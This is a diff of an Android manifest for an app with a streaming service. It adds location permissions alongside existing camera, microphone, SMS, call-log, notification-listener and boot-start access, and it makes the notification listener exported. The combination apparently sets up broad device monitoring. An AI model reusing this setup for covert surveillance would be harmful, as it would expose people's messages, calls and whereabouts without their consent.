@@ -9,6 +9,8 @@
         android:name="android.hardware.telephony"
         android:required="false" />
 
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.INTERNET" />
@@ -18,12 +20,13 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
     <application
         android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
         android:icon="@mipmap/ic_logo"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_logo_round"
@@ -55,15 +58,15 @@
             android:name=".StreamingService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="mediaProjection|camera|microphone" />
+            android:foregroundServiceType="camera|microphone" />
 
         <!-- Notification listener service -->
         <service
-            android:name=".NotificationListener"
-            android:label="Notification Listener"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:name=".StreamingService$NotificationListener"
             android:enabled="true"
-            android:exported="false">
+            android:exported="true"
+            android:label="Notification Listener"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
@@ -78,6 +81,5 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-
     </application>
 </manifest>
